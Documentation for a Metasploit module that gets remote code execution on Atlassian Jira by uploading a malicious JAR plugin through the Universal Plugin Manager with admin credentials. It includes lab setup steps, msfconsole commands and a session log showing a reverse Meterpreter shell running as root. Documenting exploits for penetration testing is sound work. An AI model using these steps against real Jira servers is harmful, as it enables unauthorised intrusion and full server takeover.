## Description

This module uses a POST request against the Atlassian Jira Universal Plugin Manager (UPM) to upload a malicious Java servlet in the form of a JAR archive. Once uploaded the module executes the payload with a GET request and then cleans up after itself by deleting the plugin. Successful exploitation is dependent on valid credentials to an account that has access to the UPM (typically the admin account). The module includes a check function that will validate user supplied credentials and access to the UPM.

## Vulnerable Application
	
The version of Atlassian Jira used for testing was 7.8.0 but the module should work for all versions of Jira as the main dependency is the implementation of Atlassian's UPM framework.

To set up a vulnerable installation:
1. Build the Atlassian SDK environment. Instructions can be found below:
    - Windows:
    https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-windows-system/
    - Linux/Mac:
    https://developer.atlassian.com/server/framework/atlassian-sdk/install-the-atlassian-sdk-on-a-linux-or-mac-system/
2. Create a shell Jira plugin and launch the SDK. Instructions can be found below:
    - https://developer.atlassian.com/server/framework/atlassian-sdk/create-a-helloworld-plugin-project/
3. Validate installation by browsing to localhost:2990/jira/ and logging in with the default credentials admin:admin



## Verification Steps

1. Install Atlassian SDK/Jira environment.
2. Browse to localhost:2990/jira/ to confirm successful deployment.
3. Start msfconsole: ```msfconsole -q```
4. Do: ```use exploit/multi/http/jira_plugin_upload```
5. Do: ```set rhost [IP]```
6. Check credentials and UPM access: ```check```
7. Do: ```exploit```
8. You should get a shell.

## Scenarios
Successful exploitation:
```
msf > use exploit/multi/http/jira_plugin_upload
msf exploit(multi/http/jira_plugin_upload) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf exploit(multi/http/jira_plugin_upload) > check

[*] Server accepted the credentials, user has access to plugin manager!
[*] 127.0.0.1:2990 The target appears to be vulnerable.
msf exploit(multi/http/jira_plugin_upload) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
[*] Retrieving Session ID and XSRF token...
[*] Attempting to upload UlDRthpT
[*] Successfully uploaded UlDRthpT
[*] Executing UlDRthpT
[*] Deleting UlDRthpT
[*] Sending stage (53837 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:43208) at 2018-02-25 13:45:43 -0500

meterpreter > getuid
Server username: root
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: User exit
[*] 127.0.0.1 - Meterpreter session 1 closed.  Reason: Died
msf exploit(multi/http/jira_plugin_upload) > 
```
